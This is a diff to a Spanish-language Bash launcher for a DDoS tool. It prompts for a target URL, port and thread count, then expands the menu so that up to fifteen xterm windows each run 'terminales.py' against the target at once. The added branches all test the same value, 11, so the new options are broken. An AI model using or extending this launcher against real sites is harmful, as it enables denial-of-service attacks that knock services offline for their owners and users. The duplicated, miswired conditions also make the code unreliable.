@@ -82,22 +82,27 @@ read -p $'\033[0;37mEscribe la url de la pagina\e[0m     = ' web
 read -p $'\033[0;37mPon el puerto a atacar  \e[0m      = ' port
 read -p $'\033[0;37mEscribe los hilos[120]\e[0m = ' thread
 
-echo "------------------------------------------------------------------"
-echo -e "$amarillo Elije:                                               -   "
-echo "------------------------------------------------------------------"
-echo -e "-$azulito (1) = Una terminal DdoS                                -              "
-echo -e "-$azulito (2) = Dos terminales DdoS                              -              " 
-echo -e "-$azulito (3) = Tres terminales DdoS                             -              "
-echo -e "-$azulito (4) = Cuatro terminales DdoS                           -              "
-echo -e "-$azulito (5) = Cinco terminales DdoS                            -              "
-echo -e "-$azulito (6) = Seis terminales DdoS                             -              "
-echo -e "-$azulito (7) = Siete terminales DdoS                            -              "
-echo -e "-$azulito (8) = Ocho terminales DdoS                             -              "
-echo -e "-$azulito (9) = Nueve terminales DdoS                            -              "
-echo -e "-$azulito (10) = Diez terminales DdoS                            -              "
-echo "------------------------------------------------------------------"
+echo "------------------------------------------------------------------------------                         "
+echo -e "$amarillo Elije:                                                           -                        "
+echo "------------------------------------------------------------------------------                         "
+echo -e "-$azulito (1) = Una terminal DdoS                                          -              "
+echo -e "-$azulito (2) = Dos terminales DdoS                                        -              " 
+echo -e "-$azulito (3) = Tres terminales DdoS                                       -              "
+echo -e "-$azulito (4) = Cuatro terminales DdoS                                     -              "
+echo -e "-$azulito (5) = Cinco terminales DdoS                                      -              "
+echo -e "-$azulito (6) = Seis terminales DdoS                                       -              "
+echo -e "-$azulito (7) = Siete terminales DdoS                                      -              "
+echo -e "-$azulito (8) = Ocho terminales DdoS                                       -              "
+echo -e "-$azulito (9) = Nueve terminales DdoS                                      -              "
+echo -e "-$azulito (10) = Diez terminales DdoS                                      -              "
+echo -e "-$azulito (11) = Once terminales DdoS                                      -              "
+echo -e "-$azulito (12) = Doce terminales DdoS  (TARDA MUCHO, NO RECOMENDABLE)      -              "
+echo -e "-$azulito (13) = Trece terminales DdoS  (TARDA MUCHO, NO RECOMENDABLE)     -              "
+echo -e "-$azulito (14) = Catorce terminales DdoS  (TARDA MUCHO, NO RECOMENDABLE)   -              "
+echo -e "-$azulito (15) = Quince terminales DdoS  (TARDA MUCHO, NO RECOMENDABLE)    -              "
+echo "------------------------------------------------------------------------------                                 "
 echo -e "---------------------------"
-read -p " ESCRIBE LAS TERMINALES QUE QUIERAS DEL 1-10  = " SA
+read -p " ESCRIBE LAS TERMINALES QUE QUIERAS DEL 1-15  = " SA
 
 
 
@@ -159,6 +164,37 @@ for i in {1..10}
 do xterm -e python3 terminales.py -s $web -p $port -t $thread &
 done
 fi
+
+if [ $SA = 11 ]; then
+for i in {1..11}
+do xterm -e python3 terminales.py -s $web -p $port -t $thread &
+done
+fi
+
+if [ $SA = 11 ]; then
+for i in {1..12}
+do xterm -e python3 terminales.py -s $web -p $port -t $thread &
+done
+fi
+
+if [ $SA = 11 ]; then
+for i in {1..13}
+do xterm -e python3 terminales.py -s $web -p $port -t $thread &
+done
+fi
+
+if [ $SA = 11 ]; then
+for i in {1..14}
+do xterm -e python3 terminales.py -s $web -p $port -t $thread &
+done
+fi
+
+if [ $SA = 11 ]; then
+for i in {1..15}
+do xterm -e python3 terminales.py -s $web -p $port -t $thread &
+done
+fi
+
 echo "$rojo HERRAMIENTA CERRADA "
 
 
